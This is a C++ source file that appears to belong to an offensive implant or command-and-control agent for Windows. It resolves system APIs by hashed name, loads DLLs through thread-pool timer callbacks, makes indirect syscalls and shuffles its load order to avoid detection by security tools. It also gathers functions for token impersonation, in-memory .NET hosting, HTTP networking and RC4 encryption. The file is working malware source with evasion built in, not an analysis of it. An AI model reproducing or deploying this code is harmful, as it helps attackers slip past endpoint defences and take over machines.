#include "Win32.hpp"
#include "Instance.hpp"
#include "StringCrypt.hpp"
#include "SecureWideString.hpp"
#include "SecureVector.hpp"
#include "Crypt.hpp"
#include <algorithm> // For std::shuffle
#include <random> // For std::default_random_engine
#include <chrono> // For std::chrono::system_clock

// Define storage for static members
NTDLL_TABLE Win32::NtdllTable = {};
KERNEL32_TABLE Win32::Kernel32Table = {};
ADVAPI32_TABLE Win32::AdvApi32Table = {};
USER32_TABLE Win32::User32Table = {};
SHELL32_TABLE Win32::Shell32Table = {};
WINHTTP_TABLE Win32::WinHttpTable = {};
MSCOREE_TABLE Win32::MSCoreeTable = {};
OLEAUT32_TABLE Win32::OleAut32Table = {};
WINSOCK_TABLE Win32::WinSockTable = {};
KERNELBASE_TABLE Win32::KernelBaseTable = {};
CRYPTSP_TABLE Win32::CryptSpTable = {};
IPHLPAPI_TABLE Win32::IpHlpApiTable = {};

void Win32::ResolveTables() {
    ResolveNative();
    ResolveKernelBase();
    ResolveKernel32();

    // Seed with a real random value
    unsigned seed = std::chrono::system_clock::now().time_since_epoch().count();

    // Create a vector of function pointers
    SecureVector<FunctionPtrType> functions;
    functions.push_back(ResolveAdvApi32);
    functions.push_back(ResolveUser32);
    functions.push_back(ResolveShell32);
    functions.push_back(ResolveWinHttp);
    functions.push_back(ResolveMSCoree);
    functions.push_back(ResolveOleAut32);
    functions.push_back(ResolveWinSock);
    functions.push_back(ResolveCryptSp);
    functions.push_back(ResolveIpHlpApi);

    // Randomly shuffle the function pointers
    std::shuffle(functions.begin(), functions.end(), std::default_random_engine(seed));

    // Call the functions in the randomized order
    for (auto& func : functions) {
        func();
    }
}

BOOL Win32::AreTablesResolved() {
    if (!NtdllTable.isResolved || !KernelBaseTable.isResolved || !Kernel32Table.isResolved || !AdvApi32Table.isResolved || !User32Table.isResolved
        || !Shell32Table.isResolved || !WinHttpTable.isResolved || !MSCoreeTable.isResolved || !OleAut32Table.isResolved || !WinSockTable.isResolved
        || !IpHlpApiTable.isResolved) {
		return FALSE;
	}
    return TRUE;
}

BOOL Win32::ResolveApi(PVOID pModuleBase, PIMAGE_NT_HEADERS pInMemImageNtHeaders, DWORD dwCryptedHash, PWIN32API pWinApi) {
    pWinApi->dwCryptedHash = dwCryptedHash;
    PIMAGE_DATA_DIRECTORY pExportEntry = pInMemImageNtHeaders->OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT;
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pInMemImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);
    DWORD dirSize = pImageExportDirectory->NumberOfFunctions;
    for (DWORD cx = 0; cx < dirSize; cx++) {
        PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
        PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];
        /* We *shouldn't* get any forwarder addresses
        if (pdwAddressOfFunctions[cx] >= pExportEntry->VirtualAddress && pdwAddressOfFunctions[cx] < pExportEntry->VirtualAddress + pExportEntry->Size) {
            char* ForwardString = (char*)pFunctionAddress;
            DWORD ForwardSLen = strlen(ForwardString);
            printf("Found forwarder: %s\n", ForwardString);
        }
        else {
            printf("Found normal: %s\n", pczFunctionName);
        }*/
        if (SystemCalls::djb2(reinterpret_cast<unsigned char*>(pczFunctionName)) == SystemCalls::xor_hash(dwCryptedHash)) {
            //printf("[+] Found address: %p\n", pFunctionAddress);
            pWinApi->pAddress = pFunctionAddress;
            return TRUE;
        }
    }
    return FALSE;
}

ModuleDetails Win32::ProxyLoadLibrary(DWORD dwCryptedHash, SecureString dllName) {
    // Prepare the function pointers
    pTpAllocPool _pTpAllocPool = (pTpAllocPool)Win32::NtdllTable.pTpAllocPool.pAddress;
    pTpSetPoolMaxThreads _pTpSetPoolMaxThreads = (pTpSetPoolMaxThreads)Win32::NtdllTable.pTpSetPoolMaxThreads.pAddress;
    pTpSetPoolMinThreads _pTpSetPoolMinThreads = (pTpSetPoolMinThreads)Win32::NtdllTable.pTpSetPoolMinThreads.pAddress;
    pTpReleasePool _pTpReleasePool = (pTpReleasePool)Win32::NtdllTable.pTpReleasePool.pAddress;
    pTpAllocTimer _pTpAllocTimer = (pTpAllocTimer)Win32::NtdllTable.pTpAllocTimer.pAddress;
    pTpSetTimer _pTpSetTimer = (pTpSetTimer)Win32::NtdllTable.pTpSetTimer.pAddress;
    pTpReleaseTimer _pTpReleaseTimer = (pTpReleaseTimer)Win32::NtdllTable.pTpReleaseTimer.pAddress;

    PTP_POOL pool = NULL;
    PTP_TIMER timer = NULL;
    TP_CALLBACK_ENVIRON pcbe;

    double loadDelay = 0.025;
    ModuleDetails moduleDetails = { 0 };
    SecureString decryptedDll = StringCrypt::DecryptString(dllName).c_str();
    LARGE_INTEGER loadDueTime, sleepDueTime;

    while (moduleDetails.BaseAddress == NULL) {
        InitializeTimerMs(&loadDueTime, 0);
        InitializeTimerMs(&sleepDueTime, loadDelay);

        // Prepare the proxy load structure
        PROXY_LOAD_PARAMS params = { 0 };
        params.dllName = decryptedDll.c_str();
        params.pLoadLibraryA = Win32::Kernel32Table.pLoadLibraryA.pAddress;

        // Set the maximum number of threads for the pool
        LONG maxThreads = 2;

        // Set the minimum number of threads for the pool
        LONG minThreads = 1;

        // Allocate a new thread pool
        Instance::NtStatus = _pTpAllocPool(&pool, NULL);
        if (!NT_SUCCESS(Instance::NtStatus)) {
            return moduleDetails;
        }

        /*
        * Initialize the callback environment, inline function
        * https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-initializethreadpoolenvironment
        */
        MyTpInitializeCallbackEnviron(&pcbe);

        /*
        * Set the pool to the callback environment, inline function
        * https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-setthreadpoolcallbackpool
        */
        MyTpSetCallbackThreadpool(&pcbe, pool);

        // Set the minimum number of threads for the pool
        Instance::NtStatus = _pTpSetPoolMinThreads(pool, minThreads);
        if (!NT_SUCCESS(Instance::NtStatus)) {
            return moduleDetails;
        }

        // Set the maximum number of threads for the pool
        Instance::NtStatus = _pTpSetPoolMaxThreads(pool, maxThreads);
        if (!NT_SUCCESS(Instance::NtStatus)) {
            return moduleDetails;
        }

        // Allocate a timer
        Instance::NtStatus = _pTpAllocTimer(&timer, (PTP_TIMER_CALLBACK)ExtractAndJump, &params, &pcbe);
        if (!NT_SUCCESS(Instance::NtStatus)) {
            return moduleDetails;
        }

        Instance::NtStatus = _pTpSetTimer(timer, &loadDueTime, 0, 0);
        if (!NT_SUCCESS(Instance::NtStatus)) {
            return moduleDetails;
        }

        SyscallPrepare(SystemCalls::SysTable.SysNtDelayExecution.wSyscallNr, SystemCalls::SysTable.SysNtDelayExecution.pRecycled);
        SysNtDelayExecution(FALSE, &sleepDueTime);

        // Release the timer when it is done
        Instance::NtStatus = _pTpReleaseTimer(timer);
        if (!NT_SUCCESS(Instance::NtStatus)) {
            return moduleDetails;
        }

        // Cleanup
        Instance::NtStatus = _pTpReleasePool(pool);
        if (!NT_SUCCESS(Instance::NtStatus)) {
            return moduleDetails;
        }

        // Increase the sleep time
        loadDelay += 0.025;

        // Get the module details
        moduleDetails = Instance::GetModuleDetails(dwCryptedHash);
    }

    return moduleDetails;
}

void Win32::ResolveNative() {    
    NTDLL_TABLE Table = { 0 };
    ModuleDetails moduleDetails = Instance::GetModuleDetails(NTDLLDLL_HASH);

    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, LDRLOADDLL_HASH, &Table.pLdrLoadDll);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, RTLINITUNICODESTRING_HASH, &Table.pRtlInitUnicodeString);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, RTLCREATEENVIRONMENT_HASH, &Table.pRtlCreateEnvironment);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, RTLALLOCATEHEAP_HASH, &Table.pRtlAllocateHeap);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, RTLREALLOCATEHEAP_HASH, &Table.pRtlReAllocateHeap);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, RTLFREEHEAP_HASH, &Table.pRtlFreeHeap);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, RTLCREATEHEAP_HASH, &Table.pRtlCreateHeap);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, RTLDESTROYHEAP_HASH, &Table.pRtlDestroyHeap);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, RTLWALKHEAP_HASH, &Table.pRtlWalkHeap);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, RTLCOPYMEMORY_HASH, &Table.pRtlCopyMemory);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, RTLZEROMEMORY_HASH, &Table.pRtlZeroMemory);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, RTLCREATEPROCESSPARAMETERSEX_HASH, &Table.pRtlCreateProcessParametersEx);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, RTLCREATEUSERTHREAD_HASH, &Table.pRtlCreateUserThread);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, CSRCLIENTCALLSERVER_HASH, &Table.pCsrClientCallServer);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, CSRCAPTUREMESSAGEMULTIUNICODESTRINGSINPLACE_HASH, &Table.pCsrCaptureMessageMultiUnicodeStringsInPlace);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, RTLEXITUSERPROCESS_HASH, &Table.pRtlExitUserProcess);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, NTDELAYEXECUTION_HASH, &Table.pNtDelayExecution);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, NTWAITFORSINGLEOBJECT_HASH, &Table.pNtWaitForSingleObject);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, NTCONTINUE_HASH, &Table.pNtContinue);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, RTLINITIALIZECRITICALSECTION_HASH, &Table.pRtlInitializeCriticalSection);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, RTLENTERCRITICALSECTION_HASH, &Table.pRtlEnterCriticalSection);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, RTLLEAVECRITICALSECTION_HASH, &Table.pRtlLeaveCriticalSection);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, TPALLOCPOOL_HASH, &Table.pTpAllocPool);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, TPSETPOOLMAXTHREADS_HASH, &Table.pTpSetPoolMaxThreads);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, TPSETPOOLMINTHREADS_HASH, &Table.pTpSetPoolMinThreads);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, TPRELEASEPOOL_HASH, &Table.pTpReleasePool);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, TPALLOCTIMER_HASH, &Table.pTpAllocTimer);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, TPSETTIMER_HASH, &Table.pTpSetTimer);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, TPRELEASETIMER_HASH, &Table.pTpReleaseTimer);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, TPALLOCWORK_HASH, &Table.pTpAllocWork);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, TPPOSTWORK_HASH, &Table.pTpPostWork);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, TPRELEASEWORK_HASH, &Table.pTpReleaseWork);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, RTLADDVECTOREDEXCEPTIONHANDLER_HASH, &Table.pRtlAddVectoredExceptionHandler);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, RTLREMOVEVECTOREDEXCEPTIONHANDLER_HASH, &Table.pRtlRemoveVectoredExceptionHandler);

    NtdllTable = Table;    
    return;
}

void Win32::ResolveKernel32() {
    KERNEL32_TABLE Table = { 0 };
    ModuleDetails moduleDetails = Instance::GetModuleDetails(KERNEL32DLL_HASH);

    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, CREATEPIPE_HASH, &Table.pCreatePipe);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, CREATEPROCESSA_HASH, &Table.pCreateProcessA);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, CREATEFIBER_HASH, &Table.pCreateFiber);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, SWITCHTOFIBER_HASH, &Table.pSwitchToFiber);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, DELETEFIBER_HASH, &Table.pDeleteFiber);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, PEEKNAMEDPIPE_HASH, &Table.pPeekNamedPipe);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, CONVERTTHREADTOFIBER_HASH, &Table.pConvertThreadToFiber);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, CREATETOOLHELP32SNAPSHOT_HASH, &Table.pCreateToolhelp32Snapshot);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, PROCESS32FIRST_HASH, &Table.pProcess32First);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, PROCESS32NEXT_HASH, &Table.pProcess32Next);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, THREAD32FIRST_HASH, &Table.pThread32First);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, THREAD32NEXT_HASH, &Table.pThread32Next);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, CREATEFILEMAPPINGA_HASH, &Table.pCreateFileMappingA);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, MAPVIEWOFFILE_HASH, &Table.pMapViewOfFile);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, CREATEEVENTA_HASH, &Table.pCreateEventA);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, GETTICKCOUNT_HASH, &Table.pGetTickCount);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, VIRTUALALLOC_HASH, &Table.pVirtualAlloc);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, LOADLIBRARYA_HASH, &Table.pLoadLibraryA);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, SETSTDHANDLE_HASH, &Table.pSetStdHandle);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, GETSTDHANDLE_HASH, &Table.pGetStdHandle);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, GETCONSOLEWINDOW_HASH, &Table.pGetConsoleWindow);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, ALLOCCONSOLE_HASH, &Table.pAllocConsole);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, WRITEFILE_HASH, &Table.pWriteFile);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, READFILE_HASH, &Table.pReadFile);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, WAITFORSINGLEOBJECT_HASH, &Table.pWaitForSingleObject);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, GETCOMMANDLINEW_HASH, &Table.pGetCommandLineW);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, GETLASTERROR_HASH, &Table.pGetLastError);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, HEAPWALK_HASH, &Table.pHeapWalk);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, VIRTUALPROTECT_HASH, &Table.pVirtualProtect);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, EXITTHREAD_HASH, &Table.pExitThread);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, EXITPROCESS_HASH, &Table.pExitProcess);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, FINDRESOURCEW_HASH, &Table.pFindResourceW);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, LOADRESOURCE_HASH, &Table.pLoadResource);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, SIZEOFRESOURCE_HASH, &Table.pSizeofResource);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, LOCKRESOURCE_HASH, &Table.pLockResource);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, HEAPALLOC_HASH, &Table.pHeapAlloc);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, GETPROCESSHEAP_HASH, &Table.pGetProcessHeap);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, GETMODULEHANDLEEXA_HASH, &Table.pGetModuleHandleExA);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, K32GETMODULEBASENAMEA_HASH, &Table.pGetModuleBaseNameA);
    Kernel32Table = Table;

    return;
}

void Win32::ResolveAdvApi32() {
    ADVAPI32_TABLE Table = { 0 };
    ModuleDetails moduleDetails = ProxyLoadLibrary(ADVAPI32DLL_HASH, StringCrypt::ADVAPI32DLL_CRYPT);

    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, GETSIDSUBAUTHORITY_HASH, &Table.pGetSidSubAuthority);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, LOOKUPACCOUNTSIDA_HASH, &Table.pLookupAccountSidA);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, LOOKUPPRIVILEGEVALUEA_HASH, &Table.pLookupPrivilegeValueA);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, IMPERSONATELOGGEDONUSER_HASH, &Table.pImpersonateLoggedOnUser);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, CREATEPROCESSWITHTOKENW_HASH, &Table.pCreateProcessWithTokenW);
    AdvApi32Table = Table;

    return;
}

void Win32::ResolveUser32() {
    USER32_TABLE Table = { 0 };
    ModuleDetails moduleDetails = ProxyLoadLibrary(USER32DLL_HASH, StringCrypt::USER32DLL_CRYPT);

    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, SHOWWINDOW_HASH, &Table.pShowWindow);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, ENUMTHREADWINDOWS_HASH, &Table.pEnumThreadWindows);
    User32Table = Table;

    return;
}

void Win32::ResolveShell32() {
    SHELL32_TABLE Table = { 0 };
    ModuleDetails moduleDetails = ProxyLoadLibrary(SHELL32DLL_HASH, StringCrypt::SHELL32DLL_CRYPT);

    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, COMMANDLINETOARGVW_HASH, &Table.pCommandLineToArgvW);
    Shell32Table = Table;

    return;
}

void Win32::ResolveWinHttp() {
    WINHTTP_TABLE Table = { 0 };
    ModuleDetails moduleDetails = ProxyLoadLibrary(WINHTTPDLL_HASH, StringCrypt::WINHTTPDLL_CRYPT);

    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, WINHTTPCLOSEHANDLE_HASH, &Table.pWinHttpCloseHandle);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, WINHTTPCONNECT_HASH, &Table.pWinHttpConnect);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, WINHTTPOPEN_HASH, &Table.pWinHttpOpen);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, WINHTTPOPENREQUEST_HASH, &Table.pWinHttpOpenRequest);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, WINHTTPQUERYDATAAVAILABLE_HASH, &Table.pWinHttpQueryDataAvailable);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, WINHTTPREADDATA_HASH, &Table.pWinHttpReadData);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, WINHTTPRECEIVERESPONSE_HASH, &Table.pWinHttpReceiveResponse);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, WINHTTPSENDREQUEST_HASH, &Table.pWinHttpSendRequest);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, WINHTTPWRITEDATA_HASH, &Table.pWinHttpWriteData);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, WINHTTPQUERYHEADERS_HASH, &Table.pWinHttpQueryHeaders);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, WINHTTPSETOPTION_HASH, &Table.pWinHttpSetOption);
    WinHttpTable = Table;

    return;
}

void Win32::ResolveMSCoree() {
    MSCOREE_TABLE Table = { 0 };
    ModuleDetails moduleDetails = ProxyLoadLibrary(MSCOREEDLL_HASH, StringCrypt::MSCOREEDLL_CRYPT);

    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, CLRCREATEINSTANCE_HASH, &Table.pCLRCreateInstance);
    MSCoreeTable = Table;

    return;
}

void Win32::ResolveOleAut32() {
    OLEAUT32_TABLE Table = { 0 };
    ModuleDetails moduleDetails = ProxyLoadLibrary(OLEAUT32DLL_HASH, StringCrypt::OLEAUT32DLL_CRYPT);

    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, SAFEARRAYCREATE_HASH, &Table.pSafeArrayCreate);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, SAFEARRAYACCESSDATA_HASH, &Table.pSafeArrayAccessData);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, SAFEARRAYUNACCESSDATA_HASH, &Table.pSafeArrayUnaccessData);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, SAFEARRAYCREATEVECTOR_HASH, &Table.pSafeArrayCreateVector);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, SAFEARRAYPUTELEMENT_HASH, &Table.pSafeArrayPutElement);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, SYSALLOCSTRING_HASH, &Table.pSysAllocString);
    OleAut32Table = Table;

    return;
}

void Win32::ResolveWinSock() {
    WINSOCK_TABLE Table = { 0 };
    ModuleDetails moduleDetails = ProxyLoadLibrary(WS2_32DLL_HASH, StringCrypt::WS2_32DLL_CRYPT);

    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, WSASTARTUP_HASH, &Table.pWSAStartup);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, WSACLEANUP_HASH, &Table.pWSACleanup);
    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, INET_NTOP_HASH, &Table.pinet_ntop);
    WinSockTable = Table;

    return;
}

void Win32::ResolveKernelBase() {
    KERNELBASE_TABLE Table = { 0 };
    ModuleDetails moduleDetails = Instance::GetModuleDetails(KERNELBASEDLL_HASH);

    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, BASEGETNAMEDOBJECTDIRECTORY_HASH, &Table.pBaseGetNamedObjectDirectory);
    KernelBaseTable = Table;

    return;
}

void Win32::ResolveCryptSp() {
    CRYPTSP_TABLE Table = { 0 };
    ModuleDetails moduleDetails = ProxyLoadLibrary(CRYPTSPDLL_HASH, StringCrypt::CRYPT32DLL_CRYPT);

    Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, SYSTEMFUNCTION032_HASH, &Table.pSystemFunction032);
    CryptSpTable = Table;

    return;
}

void Win32::ResolveIpHlpApi() {
	IPHLPAPI_TABLE Table = { 0 };
	ModuleDetails moduleDetails = ProxyLoadLibrary(IPHLPAPIDLL_HASH, StringCrypt::IPHLPAPIDLL_CRYPT);

	Table.isResolved = ResolveApi(moduleDetails.BaseAddress, moduleDetails.ImageNtHeader, GETADAPTERSADDRESSES_HASH, &Table.pGetAdaptersAddresses);
	IpHlpApiTable = Table;

	return;
}